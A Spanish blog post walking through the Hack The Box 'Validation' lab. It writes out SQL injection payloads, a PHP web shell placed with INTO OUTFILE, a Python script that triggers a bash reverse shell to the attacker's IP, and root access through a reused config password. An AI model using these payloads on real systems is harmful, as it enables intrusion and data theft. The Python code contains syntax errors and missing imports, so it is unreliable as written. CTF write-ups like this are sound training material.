---
layout: post
title: HTB_Validation
date: 2023/07/10
slug: HTB_Validation
heroImage: /assets/machines.jpg
---

# Validation {-}

## Introduccion {-}

La maquina del dia se llama Validation.

El replay del live se puede ver aqui

[![S4vitaar Validation maquina](https://img.youtube.com/vi/78i-qbhEUVU/0.jpg)](https://www.youtube.com/watch?v=78i-qbhEUVU)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.11.116
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.11.116
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.116 -oG allPorts 
extractPorts allPorts
nmap -sCV -p22,80,4566,8080 10.10.11.116 -oN targeted
```


| Puerto | Servicio   | Que se nos occure? | Que falta? |
| ------ | ---------- | ------------------ | ---------- |
| 22     | ssh        | Coneccion directa  |            |
| 80     | http       | Fuzzing            |            |
| 4566   | kwtc       |                    |            |
| 8080   | http proxy |                    |            |


### Analysando el puerto 80 {-}

#### Whatweb {-}

```bash
whatweb http://10.10.11.116
```

Vemos que estamos frente una maquina Debian con un apache 2.4.48 y PHP 7.4.23

```bash
whatweb http://10.10.11.116:8080
```

Esto nos muestra un bad gateway.

#### Analysis manual {-}

Con firefox vamos a la url 
```bash
 http://10.10.11.116 
```
 y vemos una pagina que nos permite registrar personas

```bash
admin - Brazil
s4vitar - Brazil
```

Intentamos cosas

```bash
<h1>Hola</h1>
```

Vemos que la web es vulnerable a HTML Injection.


```bash
<script>alert("hola")</script>
```

Y tambien a injeccion XSS. Pero como no estamos ni si quiera authenticado, no vamos a poder robar nada.

```bash
admin'
```

Nos pone 
```bash
 admin' 
```
. Vamos a ver si el input del pays es vulnerable, para esto utilizamos burpsuite.

## Vulnerability Assessment {-}

### Analysando SQLI con Burpsuite {-}

Intentamos cambiar el pays.

```bash
username=admin&country=Brazil'-- -
username=admin&country=Brazil' union select 1-- -
username=admin&country=Brazil' union select database()-- -
username=admin&country=Brazil' union select version()-- -
```

Aqui la web nos muestra un 1 que significa que es vulnerable a SQLI.

Miramos las bases de datos existentes

```bash
username=admin&country=Brazil' union select schema_name from information_schema.schemata-- -
```

vemos que hay:
- information_schema
- performance_schema
- mysql
- registration

Miramos las tablas existentes en registration

```bash
username=caa&country=Brazil' union select table_name from information_schema.tables where table_schema="registration"-- -
```

Vemos que solo hay una tabla registration.

Enumeramos las columnas

```bash
username=caa&country=Brazil' union select column_name from informaction_shema.columns where table_schema="registration" and table_name="registration"-- -
```

Vemos las columnas:
- username
- userhash
- country
- regtime

Con group_concat enumeramos lo que hay en esta tabla

```bash
username=caa&country=Brazil' union select group_concat(username,0x3a,userhash) from registration-- -
```

Aqui vemos 
-admin:212321297a57a5a743894a0e4a801fc3
-caa:f931822fed1932e33450b91305a0c3d

Pero son usuarios que hemos creado nosotros.

#### Depositar ficheros con SQLI {-}

```bash
username=admin&country=Brazil' union select "probando" into outfile /var/www/html/prueba.txt-- -
```

Si vamos con firefox a la url 
```bash
 http://10.10.11.116/prueba.txt 
```
 podemos ver prueba. Intentamos subir un fichero php

```bash
username=admin&country=Brazil' union select "<?php system($_REQUEST['cmd']);?>" into outfile /var/www/html/s4vishell.php-- -
```

Si vamos a la url 
```bash
 http://10.10.11.116/s4vishell.php?cmd=whoami 
```
 vemos que podemos ejecutar comandos.

### Creamos un autopwn en python {-}

```python
#!/usr/bin/python

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SINGINT, def_handler)

if len(sys.argv != 3:
    log.failure("Uso: %s <ip-address> filename" % sys.argv[0]
    sys.exit(1)

#Variables globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address

def createFile():

    data_post = {
        'username': 'caa',
        'country': """Brazil' union select "<?php system($_REQUEST['cmd']);?>" into outfile /var/www/html/%s-- -""" % (filename)
    }

    r = requests.post(main_url, data=data_post)

if __name__ == '__main__':
    createFile()

```## Vuln exploit & Gaining Access {-}

### Ganando acceso con el autopwn {-}

```python
#!/usr/bin/python

from pwn import *
import signal, pdb, requests

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SINGINT, def_handler)

if len(sys.argv != 3:
    log.failure("Uso: %s <ip-address> filename" % sys.argv[0]
    sys.exit(1)

#Variables globales
ip_address = sys.argv[1]
filename = sys.argv[2]
main_url = "http://%s/" % ip_address
lport = 443

def createFile():

    data_post = {
        'username': 'caa',
        'country': """Brazil' union select "<?php system($_REQUEST['cmd']);?>" into outfile /var/www/html/%s-- -""" % (filename)
    }

    r = requests.post(main_url, data=data_post)

def getAccess():
    data_post = {
        'cmd': "bash -c 'bash -i >& /dev/tcp/10.10.14.29/443 0>&1'"
    }

    r = requests.post(main_url + "%s" % filename, data=data_post

if __name__ == '__main__':
    createFile()
    try:
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e:
        log.error(str(e))
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

 lanzamos el script

```bash
python autopwn.py 10.10.11.116 setenso.php
```

Y ganamos acceso a la maquina. Como usuario www-data podemos leer la flag.

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
ls -la /var/www/html
cat /var/www/html/config.php
```

Aqui encontramos una contraseña. Intentamos ponerla para root

```bash
su root
Password: uhc-9qual-global-pw

whoami

#Output
root
```

Ya somos root y podemos leer la flag.
